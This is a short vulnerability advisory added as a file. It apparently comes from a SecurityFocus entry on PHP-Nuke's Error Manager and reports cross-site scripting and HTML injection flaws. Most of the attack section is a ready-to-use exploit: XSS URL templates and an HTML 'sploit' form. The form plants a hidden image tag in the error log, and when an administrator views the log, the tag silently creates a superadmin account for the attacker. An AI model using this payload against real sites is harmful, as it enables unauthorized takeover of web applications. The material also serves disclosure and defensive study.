@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/9911/info
+ 
+It has been reported that Error Manager is prone to multiple vulnerabilities. These issues are due to failure to validate user input, failure to handle exceptional conditions and simple design errors.
+ 
+These issues may be leveraged to carry out cross-site scripting attacks, reveal information about the application configuration and initiate HTML injection attacks against the affected system.
+
+http://www.example.com/nuke71/error.php?pagetitle=[xss code here]
+http://www.example.com/nuke71/error.php?error=>[xss code here]
+
+To leverage the HTML injection issue, write the following html file and use it against the affected web site. Once the admin views the error logs, an admin user will be created on the affected web site.
+
+<HTML>
+<HEAD><TITLE>Error Manager sploit</TITLE>
+</HEAD>
+<BODY bgcolor="#000000" text="#FFFFFF">
+<br><br><br>
+<center>
+
+<FORM action="http://www.example.com/error.php" method="POST">
+
+<input type="hidden" name="error" value="<img width='0' height='0' border='0'
+src='http://www.victim.com/admin.php?op=AddAuthor&add_aid=attacker&add_name=God&add_pwd=coolpass&add_email=kala@hot.ee&add_radminsuper=1'></img>404">
+<input type="submit" value="Attack">
+
+</FORM>
+
+</center>
+<br><br><br>
+
+</BODY>
+</HTML>
